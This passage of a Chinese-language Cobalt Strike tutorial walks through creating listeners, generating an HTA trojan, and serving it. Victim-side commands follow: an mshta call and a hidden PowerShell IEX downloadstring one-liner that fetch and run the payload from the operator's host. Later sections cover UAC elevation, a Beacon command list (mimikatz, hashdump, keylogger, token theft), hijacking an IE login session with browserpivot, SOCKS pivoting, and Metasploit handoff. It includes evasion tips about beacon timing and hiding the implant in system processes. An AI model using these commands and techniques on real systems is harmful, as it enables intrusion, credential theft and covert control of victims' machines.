+<h2 id="4、Reporting"><a href="#4、Reporting" class="headerlink" title="4、Reporting"></a>4、Reporting</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Activity Report   <span class="comment"># 活动报告</span></span><br><span class="line">[+] Hosts Report   <span class="comment"># 主机报告</span></span><br><span class="line">[+] Indicators of Compromise   <span class="comment"># IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</span></span><br><span class="line">[+] Sessions Report   <span class="comment"># 会话报告</span></span><br><span class="line">[+] Social Engineering Report   <span class="comment"># 社会工程报告：包括鱼叉钓鱼邮件及点击记录</span></span><br><span class="line">[+] Tactics, Techniques, and Procedures   <span class="comment"># 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</span></span><br><span class="line">[+] Reset Data   <span class="comment"># 重置数据</span></span><br><span class="line">[+] Export Data   <span class="comment"># 导出数据，导出.tsv文件格式</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5、Help"><a href="#5、Help" class="headerlink" title="5、Help"></a>5、Help</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Homepage   <span class="comment"># 官方主页</span></span><br><span class="line">[+] Support   <span class="comment"># 技术支持</span></span><br><span class="line">[+] Arsenal   <span class="comment"># 开发者</span></span><br><span class="line">[+] System information   <span class="comment"># 版本信息</span></span><br><span class="line">[+] About   <span class="comment"># 关于</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="6、工具栏"><a href="#6、工具栏" class="headerlink" title="6、工具栏"></a>6、工具栏</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636275820597-c0ef1976-4368-472e-a545-1cd0eb76135a.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.新建连接</span><br><span class="line">2.断开当前连接</span><br><span class="line">3.监听器</span><br><span class="line">4.改变视图为Pivot Graph(视图列表)</span><br><span class="line">5.改变视图为Session Table(会话列表)</span><br><span class="line">6.改变视图为Target Table(目标列表)</span><br><span class="line">7.显示所有已获取的受害主机的凭证</span><br><span class="line">8.查看已下载文件</span><br><span class="line">9.查看键盘记录结果</span><br><span class="line">10.查看屏幕截图</span><br><span class="line">11.生成无状态的可执行exe木马</span><br><span class="line">12.使用java自签名的程序进行钓鱼攻击</span><br><span class="line">13.生成office宏病毒文件</span><br><span class="line">14.为payload提供web服务以便下载和执行</span><br><span class="line">15.提供文件下载，可以选择Mime类型</span><br><span class="line">16.管理Cobalt Strike上运行的web服务</span><br><span class="line">17.帮助</span><br><span class="line">18.关于</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、基本流程"><a href="#四、基本流程" class="headerlink" title="四、基本流程"></a>四、基本流程</h1><h2 id="1、创建监听器"><a href="#1、创建监听器" class="headerlink" title="1、创建监听器"></a>1、创建监听器</h2><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了8个Listener</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Beacon DNS</span><br><span class="line">[+] Beacon HTTP</span><br><span class="line">[+] Beacon HTTPS</span><br><span class="line">[+] Beacon SMB</span><br><span class="line">[+] Beacon TCP</span><br><span class="line">[+] External C2</span><br><span class="line">[+] Foreign HTTP</span><br><span class="line">[+] Foreign HTTPS</span><br></pre></td></tr></table></figure>
+
+<p>其中 Beacon_xx  为内置监听器，包括DNS、HTTP、HTTPS、SMB、TCP五种方式的监听器；Foreign系列为外部监听器，通常与Metasploit或者Armitage联动。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644990267324-3fd540ef-b0fa-4b37-8c16-3e8eb4242370.png" alt="img"></p>
+<p>Name任意，选择所需的payload，Host为本机IP，port为没有被占用的任意端口<br>点击save即创建成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991473894-ef92c13d-adc7-4eec-8336-0256ee5bdba8.png" alt="img"></p>
+<h2 id="2、生成木马"><a href="#2、生成木马" class="headerlink" title="2、生成木马"></a>2、生成木马</h2><p>这里选择其中一种攻击方式作示范，后面再做详细解释：</p>
+<p>点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable/VBA/powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991617904-a8c176f5-097a-4c41-aa65-42fbd6ecb7c1.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278022327-12fc5d9d-9b0f-4042-bfce-b68f76fc9837.png" alt="img"></p>
+<h2 id="3、开启Web服务"><a href="#3、开启Web服务" class="headerlink" title="3、开启Web服务"></a>3、开启Web服务</h2><p>点击Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马evil.hta，点击Launch生成下载链接</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991749714-208ca344-4670-42d2-87b4-a957945d0747.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991764607-85eff98d-c82e-47a0-b487-ef80665d7181.png" alt="img"></p>
+<h2 id="4、运行木马"><a href="#4、运行木马" class="headerlink" title="4、运行木马"></a>4、运行木马</h2><p>打开受害机cmd，运行<code>mshta</code>命令。mshta.exe是微软Windows操作系统相关程序，用于执行<code>.HTA</code>文件。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://<span class="number">192.168</span>.<span class="number">100.117</span>:<span class="number">8080</span>/download/file.ext</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992318260-30994908-2949-467d-a4f3-633d75ecd0f4.png" alt="img"></p>
+<p>返回CS即可看到肉鸡上线</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992338629-d748913e-22e4-474a-baf4-dee0cdb90f62.png" alt="img"></p>
+<p>选中受害机右击，选择interact，即可进行交互，由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992496226-c591a3fd-9519-4ded-8de0-dcc13a8e8a8d.png" alt="img"></p>
+<p>或者在这里更改心跳时间</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644994692740-c9c439fa-1cbb-497f-aa12-d05b32161b64.png" alt="img"></p>
+<p>备注：beacon的命令执行功能较少用起来不方便，可以使用Ladon脚本。</p>
+<p>Ladon脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
+<p>Ladon具体使用方法：<a target="_blank" rel="noopener" href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
+<p>这里再顺嘴提一句另外的生成和利用木马方法：Attacks——Web Driver-by——Scripted Web Delivery（S）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992707356-5f6dd443-83db-49ca-9a58-51bd720fe6c8.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992785849-977addc1-0e84-4097-83d0-1fee8946a8aa.png" alt="img"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.100.117:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644993061183-e9d24ccd-b610-4627-8e1b-35dda51b3cee.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644993127452-f3ff2828-dca0-4fae-94bf-911665b4e86f.png" alt="img"></p>
+<h2 id="5、提权"><a href="#5、提权" class="headerlink" title="5、提权"></a>5、提权</h2><p>如果使用的是其他payload比如 Windows Executable，那么可以提权</p>
+<p>往监听器生成exe木马</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644996167309-416bff4a-c750-40ec-b73e-b6a892850278.png" alt="img"></p>
+<p>靶机启动exe</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999387684-e1f8525d-1f9b-4148-8f8b-b5b71798a229.png" alt="img"></p>
+<p>成功上线</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999426524-bf6ce8c4-24c7-4bfa-87fc-94b0587a1bf7.png" alt="img"></p>
+<p>在上线主机右键后，点击提权，选择uac提权。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999508228-b6cf1242-8a49-4ef8-a59d-3c3ff40e8a3f.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999532044-77b850f0-56d5-4496-813b-0a641a388ce7.png" alt="img"></p>
+<p>成功后会出现一个新的主机。之后的操作可以在新的主机进行。但遗憾的是这里提权失败了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999669439-c14fb738-a183-4ac4-9ce3-e71911248747.png" alt="img"></p>
+<p>尝试使用svc提权也失败…..这里就不纠结成功与否的问题了，懂得有提权这个功能即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999755393-c4ae643d-969e-48bc-aba3-3db8cc5e0373.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645000203697-423937ef-52e0-43b6-8f6a-8d70e10d01c4.png" alt="img"></p>
+<h2 id="6、导出报告"><a href="#6、导出报告" class="headerlink" title="6、导出报告"></a>6、导出报告</h2><p>点击Reporting-&gt;Activity Report，导出默认PDF文档</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278452683-cdfc983e-0745-4e2b-ba10-ed96702c5f63.png" alt="img"></p>
+<h1 id="五、Beacon"><a href="#五、Beacon" class="headerlink" title="五、Beacon"></a>五、Beacon</h1><p>当受害机上线以后，右击选择Interact，就可以打开Beacon Console</p>
+<p>在beacon处输入help可以看到命令说明</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     进程参数欺骗</span><br><span class="line">    blockdlls                 在子进程中阻止非Microsoft的DLLs文件</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    <span class="built_in">cd</span>                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   通过TCP连接到Beacon</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">    execute                   在目标上执行程序(无输出) （执行execute notepad后，用户只能在任务管理器等后台查看到进程）</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    <span class="built_in">exit</span>                      退出beacon</span><br><span class="line">    getprivs                  对当前令牌启用系统权限</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    <span class="built_in">help</span>                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话（如果木马依然在内存中运行，那么用户尝试删除时会发现运行中无法删除导致引起疑心，因此获取shell后最好把木马注入到(系统)进程）</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    <span class="built_in">jobs</span>                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    <span class="built_in">kill</span>                      结束进程</span><br><span class="line">    link                      通过命名管道连接到Beacon</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      给当前目标机器备注       </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      为生成的post-ex任务设置父PID</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    使用服务在主机上生成会话</span><br><span class="line">    psexec_psh                使用PowerShell在主机上生成会话</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    <span class="built_in">pwd</span>                       当前目录位置</span><br><span class="line">    reg                       查询注册表</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      在另一个PID下执行程序</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     生成一个会话 </span><br><span class="line">    spawnas                   以其他用户身份生成会话</span><br><span class="line">    spawnto                   将可执行程序注入进程</span><br><span class="line">    spawnu                    在另一个PID下生成会话</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    断开与Beacon的连接</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br></pre></td></tr></table></figure>
+
+<p>可用<code>help+命令</code>的方式查看具体命令参数说明</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span> argue</span><br><span class="line">Use: argue [<span class="built_in">command</span>] [fake arguments]</span><br><span class="line">     argue [<span class="built_in">command</span>]</span><br><span class="line">     argue</span><br><span class="line"></span><br><span class="line">Spoof [fake arguments] <span class="keyword">for</span> [<span class="built_in">command</span>] processes launched by Beacon.</span><br><span class="line">This option does not affect runu/spawnu, runas/spawnas, or post-ex <span class="built_in">jobs</span>.</span><br><span class="line"></span><br><span class="line">Use argue [<span class="built_in">command</span>] to <span class="built_in">disable</span> this feature <span class="keyword">for</span> the specified <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Use argue by itself to list programs with defined spoofed arguments.</span><br></pre></td></tr></table></figure>
+
+<p>之前说过CS与受害机默认60s进行一次交互，为了方便实验我们可以把时间设置为0</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;sleep 0</span><br></pre></td></tr></table></figure>
+
+<p>获取到Beacon后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Interact   打开beacon</span><br><span class="line">Access</span><br><span class="line">      dumphashes 获取hash</span><br><span class="line">      Elevate 提权</span><br><span class="line">      GoldenTicket 生成黄金票据注入当前会话</span><br><span class="line">      MAketoken  凭证转换</span><br><span class="line">      RunMimikatz 运行Mimikatz</span><br><span class="line">      SpawnAs 用其他用户生成CobaltStrike侦听器</span><br><span class="line">Explore</span><br><span class="line">       BrowserPivot 劫持目标浏览器进程</span><br><span class="line">       Desktop(VNC)  桌面交互</span><br><span class="line">       FileBrowser  文件浏览器</span><br><span class="line">       NetView 命令Net View</span><br><span class="line">       Portscan 端口扫描</span><br><span class="line">       Processlist 进程列表</span><br><span class="line">       Screenshot截图</span><br><span class="line">Pivoting</span><br><span class="line">       SOCKSServer 代理服务</span><br><span class="line">       Listener  反向端口转发</span><br><span class="line">       DeployVPN 部署VPN</span><br><span class="line">Spawn </span><br><span class="line">       新的通讯模式并生成会话</span><br><span class="line">Session   会话管理</span><br><span class="line">       备注，删除，心跳时间，退出</span><br></pre></td></tr></table></figure>
+
+<p>下面我就介绍一下几个常用的命令</p>
+<h2 id="1、browserpivot"><a href="#1、browserpivot" class="headerlink" title="1、browserpivot"></a>1、browserpivot</h2><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。</p>
+<p>假设受害者在通过IE浏览器登录了网站后台  </p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278752027-95c0758b-8aef-44f3-aa4a-31121d1620bd.png" alt="img"></p>
+<p>我们可以通过ps找到浏览器进程，然后通过命令进行注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; browserpivot 2600 x86</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278814655-81452a60-4c75-4f72-bd8d-850d96b2c87e.png" alt="img"></p>
+<p>这里之所以选择PID 2600是因为我们需要插入Internet Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用iexplore.exe时，该进程就是子选项卡。</p>
+<p>当然这里也可以通过图形界面注入，右击选中Explore-&gt;Browser Pivot</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278951468-a025f73a-8ccc-4226-bc40-dd52f4a25f98.png" alt="img"></p>
+<p>然后浏览器设置代理为黑客主机即本机</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279036118-4e09ba42-1709-4017-83a3-903a68e7771e.png" alt="img"></p>
+<p>然后访问受害者所访问的网页，发现无需登录直接进入后台</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279023475-b652596d-9a9e-4d94-a241-e74bf9f51033.png" alt="img"></p>
+<h2 id="2、Socks代理"><a href="#2、Socks代理" class="headerlink" title="2、Socks代理"></a>2、Socks代理</h2><p>开启socks4a代理，通过代理进行内网渗透</p>
+<p>开启socks，可以通过命令，也可以通过右键Pivoting-&gt;SOCKS Server</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; socks 2222</span><br><span class="line">[+] started SOCKS4a server on: 2222</span><br><span class="line">[+] host called home, sent: 16 bytes</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>vim /etc/proxychains.conf</code>，在文件末尾添加socks4代理服务器</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279100066-e3d17232-e04f-448b-921f-981a1286cbb8.png" alt="img"></p>
+<p>使用proxychains代理扫描内网主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sP 192.168.183.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279141555-49a0e828-61e7-4e76-ab60-ec2ab73c41aa.png" alt="img"></p>
+<p>我们还可以通过隧道将整个msf带进目标内网</p>
+<p>点击View-&gt;Proxy Pivots，选择Socks4a Proxy，点击Tunnel：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279185828-f4f24d45-f172-481f-ae0f-b4b5e7571d6b.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:192.168.183.147:2222</span><br></pre></td></tr></table></figure>
+
+<p>打开msf对内网进行扫描</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279222963-3f0ab893-41f2-4080-9272-a16acbf01d7a.png" alt="img"></p>
+<p>关闭socks</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;socks stop</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、powershell-import"><a href="#3、powershell-import" class="headerlink" title="3、powershell-import"></a>3、powershell-import</h2><p>这个功能在后渗透测试中很有用，可以导入各种powershell渗透框架，如<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">Nishang</a>、<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/">PowerSploit</a>攻击框架</p>
+<p>在beacon shell输入powershell-import，导入已有的ps文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279292369-35d13cec-3952-40fd-a336-e17dfec4d4cf.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279327323-e0b702ad-6360-4d0e-98bd-72c70063c9db.png" alt="img"></p>
+<p>关于具体有哪些命令可以操作可以查看一下相应ps文件</p>
+<h1 id="六、附录"><a href="#六、附录" class="headerlink" title="六、附录"></a>六、附录</h1><p>爆破cobalt strike密码脚本：<a target="_blank" rel="noopener" href="https://github.com/ryanohoro/csbruter">https://github.com/ryanohoro/csbruter</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279394478-5b2e3d5d-cb94-4a53-9387-142946968b9c.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279385238-8dca4ddc-d1c2-4d79-8238-4455b7be14e8.png" alt="img"></p>
+<h1 id="七、与MSF联动"><a href="#七、与MSF联动" class="headerlink" title="七、与MSF联动"></a>七、与MSF联动</h1><p>Kali IP：172.16.20.18</p>
+<p>受害者机器：172.16.20.20</p>
+<p>CS：172.16.20.19</p>
+<h3 id="1、在MSF中创建监听器"><a href="#1、在MSF中创建监听器" class="headerlink" title="1、在MSF中创建监听器"></a>1、在MSF中创建监听器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 172.16.20.18</span><br><span class="line">lhost =&gt; 172.16.20.18</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 3333</span><br><span class="line">lport =&gt; 3333</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281139408-7cba4298-67ca-4a3c-8575-384f6e6451a3.png" alt="img"></p>
+<p>注：监听器监听kali自身地址。</p>
+<h3 id="2、在CS中设置新的监听地址"><a href="#2、在CS中设置新的监听地址" class="headerlink" title="2、在CS中设置新的监听地址"></a>2、在CS中设置新的监听地址</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279929729-c1f9e277-f40d-495a-8fdc-b23042499a81.png" alt="img"></p>
+<p>注意：payload要与msf中的payload要一致。</p>
+<p>在控制中右键–增加会话，选择msf的会话。</p>
